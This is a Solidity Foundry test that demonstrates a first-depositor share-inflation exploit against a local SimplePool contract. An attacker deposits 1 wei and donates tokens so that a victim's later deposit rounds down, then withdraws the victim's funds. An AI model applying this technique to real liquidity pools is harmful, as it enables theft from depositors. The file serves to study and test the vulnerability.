// SPDX-Licence-Identifier: MIT

pragma solidity ^0.8.13;

import "../src/first-deposit.sol";
import "forge-std/test.sol";

contract Exploit is Test {
    SimplePool simplePoolContract;
    MyToken myTokenContract;

    function setUp() external {
        myTokenContract = new MyToken();
        simplePoolContract = new SimplePool(address(myTokenContract));
    }

    function testExploit() external {
        address alice = vm.addr(1);
        address bob = vm.addr(2);
        myTokenContract.transfer(alice, 1 ether + 1);
        myTokenContract.transfer(bob, 2 ether);

        console.log("Alice's MyToken balance:", myTokenContract.balanceOf(alice));
        console.log("Alice frontruns first deposit, deposits 1 wei of MyToken and 1 MyToken");

        vm.startPrank(alice);
        // Alice deposits 1 wei and gets 1 MyToken
        myTokenContract.approve(address(simplePoolContract), 1);
        simplePoolContract.deposit(1);
        // Alice transfers 1 ether to the pool, inflating the pool token price
        myTokenContract.transfer(address(simplePoolContract), 1 ether);
        console.log("Alice pool balance:", simplePoolContract.balanceOf(alice));
        vm.stopPrank();

        vm.startPrank(bob);
        // Bob deposit 2 ethers but gets 1 MyToken because of inflated price
        // uint shares = _tokenAmount * _sharesTotalSupply / _supplied;
        // shares = 2000000000000000000 * 1 / 1000000000000000001 = 1.9999999999999999999 => round down to 1
        myTokenContract.approve(address(simplePoolContract), 2 ether);
        simplePoolContract.deposit(2 ether);
        console.log("Bob pool balance (should be 2):", simplePoolContract.balanceOf(bob));
        uint256 _mathTest = (10 ether * 1) / uint256(2 ether - 1); // playing around with math and pression loss
        console.log("Math:", _mathTest);
        vm.stopPrank();

        vm.prank(alice);
        simplePoolContract.withdraw(1);

        assertEq(myTokenContract.balanceOf(alice), 1.5 ether);
        console.log("Alice's MyToken balance:", myTokenContract.balanceOf(alice));
    }
}
